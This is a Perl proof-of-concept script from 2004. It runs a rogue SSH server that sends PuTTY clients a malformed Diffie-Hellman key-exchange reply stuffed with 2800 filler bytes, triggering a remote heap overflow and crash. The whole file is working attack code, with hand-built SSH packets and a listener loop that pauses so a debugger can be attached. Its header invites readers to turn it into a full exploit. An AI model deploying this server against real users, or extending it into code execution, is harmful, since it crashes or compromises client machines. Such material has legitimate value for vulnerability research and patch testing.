#!/usr/bin/perl
#
# Yeah, babe. Putty remote heap overflow POC.
# Reproduces sigsegv on client box.
# No exploit will be published. Try to make it with your own hands
# darkgrey / 02.11.04 
#

use IO::Socket;
$port = "22";
$server = IO::Socket::INET->new(LocalPort => $port, Type => SOCK_STREAM, Reuse => 1, Listen => 2) or die "Couldn't create tcp-server.\n";
$data = "A";
$num = "2800";
$buff .= $data x $num;

$one = "SSH-1.99-OpenSSH_3.8p1\x0a";
$two = 
	
	"\x00\x00\x02\x5c". # packet length
	
	"\x07". # padding length
	
	"\x14". # msg code - 20 - key exchange init
	
	# cookie
	"\x0b\x9a\xb4\xe1\xc7\x72\xf9\x3d".
	"\xe9\x02\xe3\x33\x40\x0d\xdd\xf6".
	
	
	"\x00\x00\x00\x3d". # kex_algorithms length
	
	"\x64\x69\x66\x66".
	"\x69\x65\x2d\x68\x65\x6c\x6c\x6d\x61\x6e\x2d\x67\x72\x6f\x75\x70".
	"\x2d\x65\x78\x63\x68\x61\x6e\x67\x65\x2d\x73\x68\x61\x31\x2c\x64".
	"\x69\x66\x66\x69\x65\x2d\x68\x65\x6c\x6c\x6d\x61\x6e\x2d\x67\x72".
	"\x6f\x75\x70\x31\x2d\x73\x68\x61\x31\x00\x00\x00\x0f\x73\x73\x68".
	"\x2d\x72\x73\x61\x2c\x73\x73\x68\x2d\x64\x73\x73\x00\x00\x00\x87".
	"\x61\x65\x73\x31\x32\x38\x2d\x63\x62\x63\x2c\x33\x64\x65\x73\x2d".
	"\x63\x62\x63\x2c\x62\x6c\x6f\x77\x66\x69\x73\x68\x2d\x63\x62\x63".
	"\x2c\x63\x61\x73\x74\x31\x32\x38\x2d\x63\x62\x63\x2c\x61\x72\x63".
	"\x66\x6f\x75\x72\x2c\x61\x65\x73\x31\x39\x32\x2d\x63\x62\x63\x2c".
	"\x61\x65\x73\x32\x35\x36\x2d\x63\x62\x63\x2c\x72\x69\x6a\x6e\x64".
	"\x61\x65\x6c\x2d\x63\x62\x63\x40\x6c\x79\x73\x61\x74\x6f\x72\x2e".
	"\x6c\x69\x75\x2e\x73\x65\x2c\x61\x65\x73\x31\x32\x38\x2d\x63\x74".
	"\x72\x2c\x61\x65\x73\x31\x39\x32\x2d\x63\x74\x72\x2c\x61\x65\x73".
	"\x32\x35\x36\x2d\x63\x74\x72\x00\x00\x00\x87\x61\x65\x73\x31\x32".
	"\x38\x2d\x63\x62\x63\x2c\x33\x64\x65\x73\x2d\x63\x62\x63\x2c\x62".
	"\x6c\x6f\x77\x66\x69\x73\x68\x2d\x63\x62\x63\x2c\x63\x61\x73\x74".
	"\x31\x32\x38\x2d\x63\x62\x63\x2c\x61\x72\x63\x66\x6f\x75\x72\x2c".
	"\x61\x65\x73\x31\x39\x32\x2d\x63\x62\x63\x2c\x61\x65\x73\x32\x35".
	"\x36\x2d\x63\x62\x63\x2c\x72\x69\x6a\x6e\x64\x61\x65\x6c\x2d\x63".
	"\x62\x63\x40\x6c\x79\x73\x61\x74\x6f\x72\x2e\x6c\x69\x75\x2e\x73".
	"\x65\x2c\x61\x65\x73\x31\x32\x38\x2d\x63\x74\x72\x2c\x61\x65\x73".
	"\x31\x39\x32\x2d\x63\x74\x72\x2c\x61\x65\x73\x32\x35\x36\x2d\x63".
	"\x74\x72\x00\x00\x00\x55\x68\x6d\x61\x63\x2d\x6d\x64\x35\x2c\x68".
	"\x6d\x61\x63\x2d\x73\x68\x61\x31\x2c\x68\x6d\x61\x63\x2d\x72\x69".
	"\x70\x65\x6d\x64\x31\x36\x30\x2c\x68\x6d\x61\x63\x2d\x72\x69\x70".
	"\x65\x6d\x64\x31\x36\x30\x40\x6f\x70\x65\x6e\x73\x73\x68\x2e\x63".
	"\x6f\x6d\x2c\x68\x6d\x61\x63\x2d\x73\x68\x61\x31\x2d\x39\x36\x2c".
	"\x68\x6d\x61\x63\x2d\x6d\x64\x35\x2d\x39\x36\x00\x00\x00\x55\x68".
	"\x6d\x61\x63\x2d\x6d\x64\x35\x2c\x68\x6d\x61\x63\x2d\x73\x68\x61".
	"\x31\x2c\x68\x6d\x61\x63\x2d\x72\x69\x70\x65\x6d\x64\x31\x36\x30".
	"\x2c\x68\x6d\x61\x63\x2d\x72\x69\x70\x65\x6d\x64\x31\x36\x30\x40".
	"\x6f\x70\x65\x6e\x73\x73\x68\x2e\x63\x6f\x6d\x2c\x68\x6d\x61\x63".
	"\x2d\x73\x68\x61\x31\x2d\x39\x36\x2c\x68\x6d\x61\x63\x2d\x6d\x64".
	"\x35\x2d\x39\x36\x00\x00\x00\x09\x6e\x6f\x6e\x65\x2c\x7a\x6c\x69".
	"\x62\x00\x00\x00\x09\x6e\x6f\x6e\x65\x2c\x7a\x6c\x69\x62\x00\x00".
	"\x00\x00\x00\x00\x00\x00".
	
	"\x00\x00\x00\x00\x00". # payload
	
	"\x00\x00\x00\x00\x00\x00\x00"; # padding string


$three = 
 
	"\x00\x00\x0b\x04". # packet length -4

	"\x0a". # padding length
	
	"\x1f". # msg code - 31 - Diffie-Hellman key exchange reply
	
	# payload
	"\x00\x00\x01".
	
	$buff.

	"\x00\x00\x00\x01\x02".
	
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; # padding string


while($client=$server->accept()) {
print "OK\n";

print $client "$one";

sleep(1);

print $client "$two";

sleep(20); # time to attach
print $client "$three";

 sleep(20); # time to attach
 close($client);
}

